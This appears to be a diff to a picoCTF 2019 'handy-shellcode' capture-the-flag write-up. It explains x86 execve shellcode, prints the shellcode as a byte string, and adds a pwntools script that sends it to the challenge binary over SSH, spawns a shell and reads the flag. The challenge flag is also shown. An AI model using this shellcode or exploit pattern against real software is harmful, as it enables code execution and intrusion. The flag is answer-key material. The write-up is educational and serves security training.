@@ -129,6 +129,14 @@ int main()
 
 ```
 
+So we can see that the shellcode just inserts assembly commands onto the stack, and by modifying the control flow of our code to start executing what's on the stack, we can jump into our shell.
+
+Fun fact, the following instructions push the string that maps to the path `/bin/sh` on x86 processors.
+```
+ 8048063: 68 2f 2f 73 68        push   $0x68732f2f
+ 8048068: 68 2f 62 69 6e        push   $0x6e69622f
+```
+
 But let's get that shellcode onto one line:
 
 `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80`
@@ -191,4 +199,46 @@ jhh///sh/bin��h�4$ri1�QjY�Q��1�j
 Thanks! Executing now...
 cat flag.txt
 picoCTF{h4ndY_d4ndY_sh311c0d3_0b440487}
+```
+
+## Alternative 2
+
+With this alternative, we use pwntools from our local machine to attach and exploit remotely. 
+
+In this example, we use pwntools to ssh, then send in the prebuilt shellcode, print out the flag, and then drop the user into the shell.
+
+```python
+#!/usr/bin/env python
+from pwn import *
+import sys
+
+REMOTE = True
+
+if __name__ == "__main__":
+    if REMOTE:
+        s = ssh(host='2019shell1.picoctf.com', user='samson', password="REDACTED", port=22)
+        sh = s.process('/problems/handy-shellcode/vuln')
+    else:
+        sh = process("./vuln", stdout=process.PTY, stdin=process.PTY)
+
+    sh.sendlineafter(':\n', asm(shellcraft.linux.sh()))
+    sh.sendlineafter('$ ', 'cat /problems/handy-shellcode/flag.txt')
+    sh.interactive()
+```
+
+```bash
+$ python3.8 exploit.py  
+[+] Connecting to 2019shell1.picoctf.com on port 22: Done
+[*] samson@2019shell1.picoctf.com:
+    Distro    Ubuntu 18.04
+    OS:       linux
+    Arch:     amd64
+    Version:  4.15.0
+    ASLR:     Enabled
+[+] Starting remote process b'/problems/handy-shellcode/vuln' on 2019shell1.picoctf.com: pid 3796916
+[*] Switching to interactive mode
+picoCTF{h4ndY_d4ndY_sh311c0d3_0b440487}$ $ echo "I'm in the shell now"
+I'm in the shell now
+$ $ whoami
+samson
 ```
